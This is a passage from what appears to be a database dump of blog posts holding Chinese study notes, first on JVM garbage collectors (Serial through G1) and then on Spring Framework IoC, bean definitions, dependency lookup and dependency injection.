直到它收集结束</p>\n<h4><a id=\"5112_ParNew__1252\"></a>5.11.2 ParNew 收集器</h4>\n<p>实质上是Serial 收集器的多线程并行版本</p>\n<h4><a id=\"5113_Parallel_Scavenge__1256\"></a>5.11.3 Parallel Scavenge 收集器</h4>\n<p>Parallel Scavenge也是一款新生代收集器 同样是基于标记-复制算法实现的收集器 也是能够并行收集的多线程收集器</p>\n<p>Parallel Scavenge的特点是它的关注点和其他收集器不同 CMS等收集器的关注点是尽可能地缩短垃圾回收时用户线程的停顿时间 而Parallel Scavenge 收集器的目标则是达到一个可控的吞吐量(Throughput) 所谓的吞吐量就是运行用户代码的时间与处理器总消耗时间(运行用户代码时间 + 运行垃圾收集时间)的比值</p>\n<h4><a id=\"5114_Serial_Old__1262\"></a>5.11.4 Serial Old 收集器</h4>\n<p>Serial Old 是Serial收集器的老年代版本 同样是一个单线程收集器 使用标记整理算法</p>\n<p>这个收集器的主要意义也是供客户端模式下的HotSpot 虚拟机使用</p>\n<p>如果在服务端模式下 也可能有两种用途</p>\n<ul>\n<li>一种是在JDK 5 以及之前的版本中与Parallel Scavenge 收集器搭配使用</li>\n<li>另外一种就是作为 CMS收集器发生失败时的后备预案 在并发收集时发生Concurrent Mode Failure时使用</li>\n</ul>\n<h4><a id=\"5115_Parallel_Old__1273\"></a>5.11.5 Parallel Old 收集器</h4>\n<p>Parallel Old 是Parallel Scavenge 收集器的老年代版本 支持多线程并行收集 基于标记-整理算法实现</p>\n<p>JDK6 时提供</p>\n<h4><a id=\"5116_CMS__1279\"></a>5.11.6 CMS 收集器</h4>\n<p>CMS(Concurrent Mark Sweep) 收集器是一种以获取最短回收停顿时间为目标的收集器</p>\n<p>CMS 收集器基于标记-清除算法实现的 整个过程分为四个步骤</p>\n<ul>\n<li>初始标记</li>\n<li>并发标记</li>\n<li>重新标记</li>\n<li>并发清除</li>\n</ul>\n<p>初始标记和重新标记需要STW</p>\n<p>初始标记仅仅只是标记一下GC Roots能直接关联到的对象 速度很快</p>\n<p>并发标记阶段就是从GC Roots直接关联的对象开始遍历整个对象图的过程</p>\n<h4><a id=\"5117_Garbage_First__1296\"></a>5.11.7 Garbage First 收集器</h4>\n<p>简称G1 收集器是垃圾收集器技术发展历史上的里程碑式的成果</p>\n',10,1,'http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJJbuuATylCAAAqxRWziDM15.jpeg',2,0,'220226DP09K1F0SW','DeepunderstandingoftheJavaVirtualMachine [TOC] 1类加载器 1.1类的加载过程 加载 1:通过一个类的全限定名称获取此类的二进制字节流 2:将这个字节流所代表的静态存储结构转换为方法区的运行时数据结构 3:在内存中生成一个代表这个类的java.lang.Class对象,作为方法区这个类的各种数据的访问入口 链接 验证 文件格式的验证(openjdk/h',0,0,0,NULL,0,45,'2022-04-13 09:59:31','2022-04-03 09:55:31','[\"220329D180W7F2RP\",\"220403CS5RZ78CPH\"]',0),('220403CSAF3Z1N9P','Spring 编程思想','<p>[TOC]</p>\n<h2><a id=\"Spring_2\"></a>Spring特性总览</h2>\n<h3><a id=\"_4\"></a>核心特性</h3>\n<ul>\n<li>IOC容器</li>\n<li>Spring事件</li>\n<li>资源管理</li>\n<li>国际化</li>\n<li>校验</li>\n<li>数据绑定</li>\n<li>类型转换</li>\n<li>Spring表达式</li>\n<li>面向切面编程</li>\n</ul>\n<h3><a id=\"_16\"></a>数据存储</h3>\n<ul>\n<li>JDBC事务抽象</li>\n<li>DAO支持</li>\n<li>O/R映射</li>\n<li>XML编列(XML的序列化和反序列化)</li>\n</ul>\n<h3><a id=\"Web_23\"></a>Web技术</h3>\n<p>Web Servlet技术栈</p>\n<ul>\n<li>Spring MVC</li>\n<li>WebSocket</li>\n<li>SockJS</li>\n</ul>\n<p>Web Reactive 技术栈</p>\n<ul>\n<li>Spring WebFlux</li>\n<li>WebClient</li>\n<li>WebSocket</li>\n</ul>\n<h3><a id=\"_37\"></a>技术整合</h3>\n<ul>\n<li>远程调用: RMI(Java标准的远程方法调用); Hessioan 开源协议, Dubbo基于该协议</li>\n<li>Java消息服务(JMS)</li>\n<li>Java连接架构(JCA)</li>\n<li>Java管理扩展(JMX)</li>\n<li>Java邮件客户端</li>\n<li>本地任务</li>\n<li>本地调度</li>\n<li>缓存抽象</li>\n<li>Spring测试</li>\n</ul>\n<p>Java1.3 引入了动态代理</p>\n<p>Spring Boot1.x基于Spirng 4开发的, 而SpringBoot 2.x是基于Spring 5开发的</p>\n<h2><a id=\"Java_53\"></a>Java版本依赖与支持</h2>\n<table>\n<thead>\n<tr>\n<th>Spring Framework版本</th>\n<th>Java标准版</th>\n<th>Java企业版</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1.x</td>\n<td>1.3+</td>\n<td>J2EE 1.3+</td>\n</tr>\n<tr>\n<td>2.x</td>\n<td>1.4.2+</td>\n<td>J2EE 1.3+</td>\n</tr>\n<tr>\n<td>3.x</td>\n<td>5+</td>\n<td>J2EE 1.4 和 Java EE5</td>\n</tr>\n<tr>\n<td>4.x</td>\n<td>6+</td>\n<td>Java EE 6 和 7</td>\n</tr>\n<tr>\n<td>5.x</td>\n<td>8+</td>\n<td>Java EE 7</td>\n</tr>\n</tbody>\n</table>\n<h2><a id=\"Spring_Modular_63\"></a>Spring 模块化设计(Modular)</h2>\n<ul>\n<li>spring-aop</li>\n<li>spring-aspects</li>\n<li>spring-context-indexer</li>\n<li>spring-context-support</li>\n<li>spring-context</li>\n<li>spring-core</li>\n<li>spring-expression</li>\n<li>spring-instrument</li>\n<li>spring-jcl</li>\n<li>spring-jdbc</li>\n<li>spring-jms</li>\n<li>spring-messaging</li>\n<li>spring-orm</li>\n<li>spring-oxm</li>\n<li>spring-test</li>\n<li>spring-tx</li>\n<li>spring-web</li>\n<li>spring-webflux</li>\n<li>spring-webmvc</li>\n<li>spring-websocket</li>\n</ul>\n<p>JAX-RS: Java标准的注解的方式驱动来开发REST服务</p>\n<h2><a id=\"Java_88\"></a>Java语法变化</h2>\n<ul>\n<li>\n<p>2004 JDK5 枚举、泛型、注解、装箱和拆箱</p>\n</li>\n<li>\n<p>2006 JDK6 @Override接口</p>\n</li>\n<li>\n<p>2011 JDK7 Diamond语法(&lt;&gt;)、多Catch、Try(ARM(Auto Resource Management)try-with-resources)</p>\n</li>\n<li>\n<p>2014 JDK8 Lambda语法、可重复注解、类型注解</p>\n</li>\n<li>\n<p>2017 JDK9 模块化、接口私有方法</p>\n</li>\n<li>\n<p>2018 JDK10 局部变量类型推断(var)</p>\n<p>从Java9 和Java10开始 Spring Framework5里面并没有提供Java9和Java10之后语法或者API的支持</p>\n</li>\n</ul>\n<h2><a id=\"Spring_IOC__104\"></a>Spring IOC 容器概述</h2>\n<ul>\n<li>Spring IOC 依赖查找</li>\n<li>Spring IOC 依赖注入</li>\n<li>Spring IOC 依赖来源</li>\n<li>Spring IOC 配置元信息</li>\n<li>Spring IOC 容器</li>\n<li>Spring 应用上下文</li>\n<li>使用Spring IOC容器</li>\n<li>Spring IOC 容器生命周期</li>\n</ul>\n<h3><a id=\"Spring_IOC__115\"></a>Spring IOC 依赖查找</h3>\n<ul>\n<li>根据Bean名称查找\n<ul>\n<li>实时查找</li>\n<li>延迟查找</li>\n</ul>\n</li>\n<li>根据Bean类型查找\n<ul>\n<li>单个Bean对象</li>\n<li>集合Bean对象</li>\n</ul>\n</li>\n<li>根据Bean名称 + 类型查找</li>\n<li>根据Java注解查找\n<ul>\n<li>单个Bean对象</li>\n<li>集合Bean对象</li>\n</ul>\n</li>\n</ul>\n<h3><a id=\"Spring_IOC__128\"></a>Spring IOC 依赖注入</h3>\n<p>根据Bean 名称注入</p>\n<p>根据 Bean 类型注入</p>\n<ul>\n<li>单个 Bean 对象</li>\n<li>集合 Bean 对象</li>\n</ul>\n<p>注入容器内建Bean 对象</p>\n<p>注入非 Bean 对象</p>\n<p>注入类型</p>\n<ul>\n<li>实时注入</li>\n<li>延迟注入</li>\n</ul>\n<h3><a id=\"Spring_IOC__146\"></a>Spring IOC 配置元信息</h3>\n<p>Bean定义配置</p>\n<ul>\n<li>基于XML文件</li>\n<li>基于Properties文件</li>\n<li>基于Java注解</li>\n<li>基于JavaAPI</li>\n</ul>\n<p>IOC 容器配置</p>\n<ul>\n<li>基于XML文件</li>\n<li>基于Java注解</li>\n<li>基于JavaAPI</li>\n</ul>\n<p>外部化属性配置</p>\n<ul>\n<li>基于Java配置</li>\n</ul>\n<h3><a id=\"Spring__165\"></a>Spring 应用上下文</h3>\n<p>ApplicationContext和BeanFactory的关系</p>\n<p>ApplicationContext除了IOC的角色, 还提供了</p>\n<ul>\n<li>面向切面(AOP)</li>\n<li>配置元信息</li>\n<li>资源管理</li>\n<li>事件</li>\n<li>国际化</li>\n<li>注解</li>\n<li>Environment抽象</li>\n</ul>\n<p>BeanFactory是 Spring 底层 IOC 容器</p>\n<p>ApplicationContext 是具备应用特性的 BeanFactory 超集</p>\n<h3><a id=\"Spring_Bean__183\"></a>Spring Bean 基础</h3>\n<h4><a id=\"Spring_Bean_185\"></a>定义Spring Bean</h4>\n<p>什么是BeanDefinition</p>\n<p>BeanDefinition是Spring Framework 中定义Bean的配置元信息接口</p>\n<ul>\n<li>Bean的类名</li>\n<li>Bean行为配置元素, 如作用域、自动绑定的模式、生命周期回调等</li>\n<li>其他Bean引用, 又称为合作者或者依赖</li>\n<li>配置设置, 比如Bean属性</li>\n</ul>\n<p>BeanDefinition元信息</p>\n<table>\n<thead>\n<tr>\n<th>属性</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Class</td>\n<td>Bean 全类名 必须是具体类名 不能用抽象类或者接口</td>\n</tr>\n<tr>\n<td>Name</td>\n<td>Bean 的名称或者ID</td>\n</tr>\n<tr>\n<td>Scope</td>\n<td>Bean 的作用域 比如 singleton、prototype</td>\n</tr>\n<tr>\n<td>Constructor arguments</td>\n<td>Bean 构造器参数(用于依赖注入)</td>\n</tr>\n<tr>\n<td>Properties</td>\n<td>Bean 属性设置(用于依赖注入)</td>\n</tr>\n<tr>\n<td>Autowiring mode</td>\n<td>Bean 自动绑定模式(如 通过名称 byName)</td>\n</tr>\n<tr>\n<td>Lazy initialization mode</td>\n<td>Bean 延迟初始化模式(延迟和非延迟)</td>\n</tr>\n<tr>\n<td>Initialization method</td>\n<td>Bean 初始化回调方法名称</td>\n</tr>\n<tr>\n<td>Destruction method</td>\n<td>Bean 销毁回调方法名称</td>\n</tr>\n</tbody>\n</table>\n<p>BeanDefinition 构建</p>\n<ul>\n<li>通过 BeanDefinitionBuilder</li>\n<li>通过 AbstractBeanDefinition 以及派生类</li>\n</ul>\n<h4><a id=\"_Spring_Bean_215\"></a>命名 Spring Bean</h4>\n<p>Bean 的名称</p>\n<ul>\n<li>\n<p>每个 Bean 拥有一个或者多个标识符, 这些标识符在Bean 所在的容器必须是唯一的, 通常 一个Bean仅有一个标识符, 如果需要额外的 可考虑使用别名来扩充</p>\n</li>\n<li>\n<p>在基于XML的配置元信息中(基于XML配置不一定是基于XML文件 可以是网络中XML或者本地文件)可使用id或者name属性来规定Bean的标识符, 通常Bean的标识符由字母组成, 允许出现特殊字符, 如果要想引入Bean的别名的话, 可在name属性使用<code>,</code> 或者<code>;</code> 来间隔</p>\n</li>\n<li>\n<p>Bean的id或者name属性并非必须规定, 如果留空的话, 容器会为Bean自动生成一个唯一的名称</p>\n</li>\n<li>\n<p>Bean的命名尽管没有限制, 不过建议采用驼峰的方式, 更符合Java的命名约定</p>\n</li>\n</ul>\n<p>Bean名称生成器(BeanNameGenerator)由Spring Framework 2.0.3引入 有两种实现</p>\n<ul>\n<li>DefaultBeanNameGenerator 默认通用的BeanNameGenerator实现</li>\n<li>AnnotationBeanNameGenerator 基于注解扫描的BeanNameGenerator实现</li>\n</ul>\n<h4><a id=\"_Spring_Bean_232\"></a>注册 Spring Bean</h4>\n<p>BeanDefinition 注册</p>\n<p>XML 配置元信息</p>\n<pre><div class=\"hljs\"><code class=\"lang-xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">bean</span> <span class=\"hljs-attr\">name</span> = <span class=\"hljs-string\">&quot;&quot;</span> /&gt;</span>\n</code></div></pre>\n<p>Java 注解配置元信息</p>\n<ul>\n<li>@Bean</li>\n<li>@Component</li>\n<li>@Import</li>\n</ul>\n<p>Java API 配置元信息</p>\n<ul>\n<li>命名方式: BeanDefinitionRegistry#registerBeanDefinition(String, BeanDefinition)</li>\n<li>非命名方式: BeanDefinitionReaderUtils#(AbstractBeanDefinition definition, BeanDefinitionRegistry registry)</li>\n<li>配置类方式: AnnotatedBeanDefinitionReader#register(Class&lt;?&gt;… componentClasses)</li>\n</ul>\n<h4><a id=\"_Spring_Bean_254\"></a>实例化 Spring Bean</h4>\n<p>Bean 实例化</p>\n<p>常规方式</p>\n<ul>\n<li>通过构造器(配置元信息: XML; Java注解; Java API)</li>\n<li>通过静态工厂方法(配置元信息: XML; Java注解; Java API)</li>\n<li>通过Bean 工厂方法(配置元信息: XML; Java注解; Java API)</li>\n<li>通过 FactoryBean(配置元信息: XML; Java注解; Java API)</li>\n</ul>\n<p>特殊方式</p>\n<ul>\n<li>通过 ServiceLoaderFactoryBean</li>\n<li>通过AutowireCapableBeanFactory#createBean(Class, int, boolean)</li>\n<li>通过 BeanDefinitionRegistry#registerBeanDefinition(String, BeanDefinition)</li>\n</ul>\n<h4><a id=\"_Spring_Bean_271\"></a>初始化 Spring Bean</h4>\n<p>Bean 初始化</p>\n<ul>\n<li>\n<p>@PostConstruct 标注方法</p>\n</li>\n<li>\n<p>实现 InitializingBean 接口的 afterPropertiesSet()方法</p>\n</li>\n<li>\n<p>自定义初始化方法</p>\n<ul>\n<li>\n<p>XML 配置:</p>\n<pre><div class=\"hljs\"><code class=\"lang-xml\"> <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">bean</span> <span class=\"hljs-attr\">init-method</span>=<span class=\"hljs-string\">&quot;init&quot;</span> /&gt;</span>\n</code></div></pre>\n</li>\n<li>\n<p>Java 注解: @Bean(initMethod=&quot;&quot;)</p>\n</li>\n<li>\n<p>Java API: AbstractBeanDefinition#setInitMethodName(String)</p>\n</li>\n</ul>\n</li>\n</ul>\n<h4><a id=\"_Spring_Bean_291\"></a>延迟初始化 Spring Bean</h4>\n<p>Bean 延迟初始化</p>\n<ul>\n<li>\n<p>XML 配置:</p>\n<pre><div class=\"hljs\"><code class=\"lang-xml\"> <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">bean</span> <span class=\"hljs-attr\">lazy-init</span>=<span class=\"hljs-string\">&quot;true&quot;</span>/&gt;</span>\n</code></div></pre>\n</li>\n<li>\n<p>Java 注解 @Lazy 默认为true</p>\n</li>\n</ul>\n<h4><a id=\"_Spring_Bean_303\"></a>销毁 Spring Bean</h4>\n<p>Bean 销毁</p>\n<ul>\n<li>\n<p>@PreDestroy</p>\n</li>\n<li>\n<p>实现 DisposableBean 接口的destroy() 方法</p>\n</li>\n<li>\n<p>自定义销毁方法</p>\n<ul>\n<li>\n<p>XML 配置:</p>\n<pre><div class=\"hljs\"><code class=\"lang-xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">bean</span> <span class=\"hljs-attr\">destroy</span>=<span class=\"hljs-string\">&quot;&quot;</span>/&gt;</span>\n</code></div></pre>\n</li>\n<li>\n<p>Java 注解: @Bean(destroy=&quot;&quot;)</p>\n</li>\n<li>\n<p>Java API: AbstractBeanDefinition#setDestroyMethodName(String）</p>\n</li>\n</ul>\n</li>\n</ul>\n<h4><a id=\"Bean__323\"></a>Bean 垃圾回收</h4>\n<ul>\n<li>关闭 Spring 容器</li>\n<li>执行 GC</li>\n<li>Spring Bean 覆盖的finalize() 方法被调用</li>\n</ul>\n<p>Spring IOC 依赖查找</p>\n<p>单一类型依赖查找</p>\n<ul>\n<li>根据 Bean 名称查找\n<ul>\n<li>getBean(String)</li>\n<li>Spring 2.5 覆盖默认参数: getBean(String , Object…)</li>\n</ul>\n</li>\n<li>根据 Bean 类型查找\n<ul>\n<li>实时查找\n<ul>\n<li>Spring 3.0 getBean(Class)</li>\n<li>Spring 4.1 覆盖默认参数: getBean(Class, Object…)</li>\n</ul>\n</li>\n<li>Spring 5.1 延迟查找\n<ul>\n<li>getBeanProvider(Class)</li>\n<li>getBeanProvider(Resolvable Type)</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>根据 Bean 名称 + 类型查找: getBean(String,  Class)</li>\n</ul>\n<h2><a id=\"Spring_IOC__345\"></a>Spring IOC 依赖查找</h2>\n<h3><a id=\"_347\"></a>集合类型依赖查找</h3>\n<p>集合类型依赖查找接口: ListableBeanFactory</p>\n<p>根据 Bean 类型查找</p>\n<ul>\n<li>获取同类型 Bean 名称列表\n<ul>\n<li>getBeanNamesForType(Class)</li>\n<li>Spring 4.2 getBeanNamesForType(ResolvableType)</li>\n</ul>\n</li>\n<li>获取同类型Bean 实例列表\n<ul>\n<li>getBeansOfType(Class) 以及重载方法</li>\n</ul>\n</li>\n</ul>\n<p>通过注解类型查找</p>\n<ul>\n<li>Spring 3.0 获取标注类型 Bean 名称列表\n<ul>\n<li>getBeanNamesForAnnotation(Class&lt;? extends Annotation&gt;)</li>\n</ul>\n</li>\n<li>Spring 3.0 获取标注类型 Bean 实例列表\n<ul>\n<li>getBeansWithAnnotation(Class&lt;? extends Annotation&gt;)</li>\n</ul>\n</li>\n<li>Spring 3.0 获取指定名称 + 标注类型 Bean 实例\n<ul>\n<li>findAnnotationOnBean(String, Class&lt;? extends Annotation&gt;)</li>\n</ul>\n</li>\n</ul>\n<h3><a id=\"_368\"></a>层次性依赖查找</h3>\n<p>层次性依赖查找接口: HierarchicalBeanFactory</p>\n<p>双亲 BeanFactory: getParentBeanFactory()</p>\n<p>层次性查找</p>\n<ul>\n<li>根据 Bean 名称查找 , 基于 containsLocalBean 方法实现</li>\n<li>根据 Bean 类型查找实例列表\n<ul>\n<li>单一实例: BeanFactoryUtils#beanOfType</li>\n<li>集合类型: BeanFactoryUtils#beansOfTypeIncludingAncestors</li>\n</ul>\n</li>\n<li>根据 Java 注解查找名称列表\n<ul>\n<li>BeanFactoryUtils#beanNamesForTypeIncludingAncestors</li>\n</ul>\n</li>\n</ul>\n<h3><a id=\"_383\"></a>安全依赖查找</h3>\n<table>\n<thead>\n<tr>\n<th>依赖查找类型</th>\n<th>代表实现</th>\n<th>是否安全</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>单一类型查找</td>\n<td>BeanFactory#getBean</td>\n<td>否</td>\n</tr>\n<tr>\n<td></td>\n<td>ObjectFactory#getObject</td>\n<td>否</td>\n</tr>\n<tr>\n<td></td>\n<td>ObjectProvider#getIfAvailable</td>\n<td>是</td>\n</tr>\n<tr>\n<td>集合类型查找</td>\n<td>ListableBeanFactory#getBeansOfType</td>\n<td>是</td>\n</tr>\n<tr>\n<td></td>\n<td>ObjectProvider#stream</td>\n<td>是</td>\n</tr>\n</tbody>\n</table>\n<h3><a id=\"_393\"></a>内建可查找的依赖</h3>\n<p>AbstractApplicationContext内建可查找的依赖</p>\n<p>Spring 内建单例对象</p>\n<table>\n<thead>\n<tr>\n<th>Bean 名称</th>\n<th>Bean 实例</th>\n<th>使用场景</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>environment</td>\n<td>Environment 对象</td>\n<td>外部化配置以及 Profiles</td>\n</tr>\n<tr>\n<td>systemProperties</td>\n<td>java.utilProperties 对象</td>\n<td>Java 系统属性</td>\n</tr>\n<tr>\n<td>systemEnvironment</td>\n<td>java.util.Map 对象</td>\n<td>操作系统环境变量</td>\n</tr>\n<tr>\n<td>messageSource</td>\n<td>MessageSource 对象</td>\n<td>国际化文案</td>\n</tr>\n<tr>\n<td>lifecycleProcessor</td>\n<td>LifecycleProcessor 对象</td>\n<td>Lifecycle Bean 处理器</td>\n</tr>\n<tr>\n<td>applicationEventMulticaster</td>\n<td>ApplicationEventMulticaster 对象</td>\n<td>Spring 事件广播器</td>\n</tr>\n</tbody>\n</table>\n<p>注解驱动 Spring 应用上下文内建可查找的依赖</p>\n<p>org.springframework.context.annotation.AnnotationConfigUtils类中</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">Bean名称</th>\n<th>Bean 实例</th>\n<th>使用场景</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">internalConfigurationAnnotationProcessor</td>\n<td>ConfigurationClassPostProcessor 对象</td>\n<td>处理 Spring 配置</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">internalAutowiredAnnotationProcessor</td>\n<td>AutowiredAnnotationBeanPostProcessor对象</td>\n<td>处理 @Autowired 以及 @Value注解</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">internalCommonAnnotationProcessor</td>\n<td>CommonAnnotationBeanPostProcessor对象</td>\n<td>(条件激活) 处理 JSR-250 注解 如 @PostConstruct等</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">internalEventListenerProcessor</td>\n<td>EventListenerMethodProcessor对象</td>\n<td>处理标注 @EventListener 的Spring 事件监听方法</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">event.internalEventListenerFactory</td>\n<td>DefaultEventListenerFactory对象</td>\n<td>@ EventListener 事件监听方法适配为 ApplicationListener</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">internalPersistenceAnnotationProcessor</td>\n<td>PersistenceAnnotationBeanPostProcessor对象</td>\n<td>(条件激活) 处理 JPA 注解场景</td>\n</tr>\n</tbody>\n</table>\n<h3><a id=\"_421\"></a>依赖查找中的经典异常</h3>\n<table>\n<thead>\n<tr>\n<th>异常类型</th>\n<th>触发条件</th>\n<th>场景举例</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>NoSuchBeanDefinitionException</td>\n<td>当查找Bean 不存在于 IOC 容器时</td>\n<td>BeanFactory#getBean;ObjectFactory#getObject</td>\n</tr>\n<tr>\n<td>NoUniqueBeanDefinitionException</td>\n<td>类型查找时 IOC 容器存在多个 Bean 实例</td>\n<td>BeanFactory#getBean(Class)</td>\n</tr>\n<tr>\n<td>BeanInstantiationException</td>\n<td>当 Bean 所对应的类型为非具体类时</td>\n<td>BeanFactory#getBean</td>\n</tr>\n<tr>\n<td>BeanCreationException</td>\n<td>当 Bean 初始化过程中</td>\n<td>Bean 初始化方法执行异常时</td>\n</tr>\n<tr>\n<td>BeanDefinitionStoreException</td>\n<td>当 BeanDefinition 配置元信息非法时</td>\n<td>XML 配置资源无法打开时</td>\n</tr>\n</tbody>\n</table>\n<p>ObjectFactory 和 BeanFactory 的区别</p>\n<p>两者都提供了 依赖查找 的能力</p>\n<p>ObjectFactory仅关注一个或者一种类型的 Bean 依赖查找, 且自身并不具备依赖查找的能力, 能力则由 BeanFactory 输出</p>\n<p>BeanFactory 则提供了单一类型、集合类型以及层次性等多种依赖查找方式</p>\n<p>BeanFactory.getBean 操纵是否线程安全: BeanFactory.getBean 方法的执行是线程安全的, 操作过程中会增加互斥锁(syn)</p>\n<h2><a id=\"Spring__441\"></a>Spring 依赖注入</h2>\n<p>依赖注入的模式和类型</p>\n<p>手动类型</p>\n<ul>\n<li>XML 资源配置元信息</li>\n<li>Java 注解配置元信息</li>\n<li>API 配置元信息</li>\n</ul>\n<p>自动模式 实现方提供自动关联的方式 按照内建的注入规则</p>\n<ul>\n<li>Autowiring(自动绑定)</li>\n</ul>\n<h3><a id=\"_455\"></a>自动绑定模式</h3>\n<table>\n<thead>\n<tr>\n<th>模式</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>no</td>\n<td>默认值 未激活Autowiring 需要手动指定依赖注入对象</td>\n</tr>\n<tr>\n<td>byName</td>\n<td>根据被注入属性的名称作为 Bean 名称进行依赖查找 并将对象设置到该属性</td>\n</tr>\n<tr>\n<td>byType</td>\n<td>根据被注入属性的类型作为依赖类型进行查找 并将对象设置到该属性</td>\n</tr>\n<tr>\n<td>constructor</td>\n<td>特殊 byType 类型 用于构造器参数</td>\n</tr>\n</tbody>\n</table>\n<h3><a id=\"_464\"></a>接口回调注入</h3>\n<p>Aware 系列接口回调</p>\n<table>\n<thead>\n<tr>\n<th>内建接口</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>BeanFactoryAware</td>\n<td>获取 IOC 容器  BeanFactory</td>\n</tr>\n<tr>\n<td>ApplicationContextAware</td>\n<td>获取 Spring 应用上下文 ApplicationContext对象</td>\n</tr>\n<tr>\n<td>EnvironmentLoaderAware</td>\n<td>获取 Environment 对象</td>\n</tr>\n<tr>\n<td>ResourceLoaderAware</td>\n<td>获取资源加载对象  ResourceLoader</td>\n</tr>\n<tr>\n<td>BeanClassLoaderAware</td>\n<td>获取加载当前 Bean Class 的 ClassLoader</td>\n</tr>\n<tr>\n<td>BeanNameAware</td>\n<td>获取当前 Bean 的名称</td>\n</tr>\n<tr>\n<td>MessageSourceAware</td>\n<td>获取 MessageSource 对象 用于 Spring 国际化</td>\n</tr>\n<tr>\n<td>ApplicationEventPublishAware</td>\n<td>获取 ApplicationEventPublishAware 对象 用于Spring 事件</td>\n</tr>\n<tr>\n<td>EmbeddedValueResolverAware</td>\n<td>获取 StringValueResolver 对象用于占位符处理</td>\n</tr>\n</tbody>\n</table>\n<h3><a id=\"_480\"></a>依赖注入选择</h3>\n<ul>\n<li>低依赖: 构造器注入(参数较少时)</li>\n<li>多依赖: Setter 方法注入(不能保证顺序)</li>\n<li>便利性: 字段注入</li>\n<li>声明类: 方法注入</li>\n</ul>\n<h3><a id=\"_487\"></a>基础类型注入</h3>\n<ul>\n<li>原生类型</li>\n<li>标量类型: Number、 Character、 Boolean、 Enum、 Locale、Charset、Currency、Properties 、UUID</li>\n<li>常规类型: Object 、String 、TimeZone、Calendar、Optional</li>\n<li>Spring 类型: Resource、InputSource、Formatter</li>\n</ul>\n<h3><a id=\"_494\"></a>限定注入</h3>\n<p>使用 @Qualifier注解</p>\n<ul>\n<li>通过 Bean 名称限定</li>\n<li>通过分组限定</li>\n</ul>\n<p>基于注解 @Qualifier 扩展限定</p>\n<ul>\n<li>自定义注解 如 Spring Cloud @LoadBalanced</li>\n</ul>\n<h3><a id=\"_505\"></a>延迟注入</h3>\n<p>使用 API ObjectFactory 延迟注入</p>\n<ul>\n<li>单一类型</li>\n<li>集合类型</li>\n</ul>\n<p>使用 API ObjectProvider 延迟注入(推荐)</p>\n<ul>\n<li>单一类型</li>\n<li>集合类型</li>\n</ul>\n<h3><a id=\"_517\"></a>依赖处理过程</h3>\n<ul>\n<li>入口 DefaultListableBeanFactory#resolveDependency</li>\n<li>依赖描述符  DependencyDescriptor</li>\n<li>自定绑定候选对象处理器 AutowireCandidateResolver</li>\n</ul>\n<h3><a id=\"Autowired__523\"></a>@Autowired 注入</h3>\n<ul>\n<li>元信息解析</li>\n<li>依赖查找</li>\n<li>依赖注入(字段、方法)</li>\n</ul>\n<p>AutowiredAnnotationBeanPostProcessor</p>\n<p>用来处理@Autowired和JSR-330@Inject注解</p>\n<p>CommonAnnotationBeanPostProcessor</p>\n<p>用来处理更为通用的注解</p>\n<h3><a id=\"Java_537\"></a>Java通用注解注入原理</h3>\n<p>CommonAnnotationBeanPostProcessor</p>\n<p>注入注解</p>\n<ul>\n<li>java.xml.ws.WebServiceRef</li>\n<li>javax.ejb.EJB</li>\n<li>javax.annotation.Resource</li>\n</ul>\n<p>生命周期注解</p>\n<ul>\n<li>javax.annotation.PostConstruct</li>\n<li>javax.annotation.PreDestroy</li>\n</ul>\n<h3><a id=\"_552\"></a>自定义依赖注解</h3>\n<p>基于 AutowiredAnnotationBeanPostProcessor 实现</p>\n<p>自定义实现</p>\n<p>1 生命周期处理</p>\n<ul>\n<li>InstantiationAwareBeanPostProcessor</li>\n<li>MergedBeanDefinitionPostProcessor</li>\n</ul>\n<p>2 元数据</p>\n<ul>\n<li>InjectedElement</li>\n<li>InjectionMetadata</li>\n</ul>\n<h3><a id=\"_568\"></a>面试题</h3>\n<p>有多少种依赖注入的方式</p>\n<ul>\n<li>构造器注入</li>\n<li>Setter注入</li>\n<li>字段注入</li>\n<li>方法注入</li>\n<li>接口回调注入</li>\n</ul>\n<p>构造器注入好还是Setter注入好</p>\n<p>没有最好的方案, 只有相对的合理</p>\n<p>两种依赖注入的方式均可使用; 如果是必须依赖的话, 推荐使用构造器注入, Setter用于可选依赖</p>\n<p>如果依赖的参数比较少的话, 推荐使用构造器注入, 构造器注入可以保证线程安全, 确保数据的一致性</p>\n<h2><a id=\"_586\"></a>依赖来源</h2>\n<h3><a id=\"_588\"></a>依赖查找来源</h3>\n<p>Spring BeanDefinition</p>\n<ul>\n<li>\n<pre><div class=\"hljs\"><code class=\"lang-xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">bean</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;user&quot;</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">&quot;&quot;</span>/&gt;</span>\n</code></div></pre>\n</li>\n<li>\n<p>@Bean public User user(){}</p>\n</li>\n<li>\n<p>BeanDefinitionBuilder</p>\n</li>\n</ul>\n<p>单例对象</p>\n<ul>\n<li>API实现</li>\n</ul>\n<h3><a id=\"_604\"></a>依赖注入的来源</h3>\n<p>Spring BeanDefinition</p>\n<ul>\n<li>\n<pre><div class=\"hljs\"><code class=\"lang-xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">bean</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;user&quot;</span> <span class=\"hljs-attr\">class</span>=<span 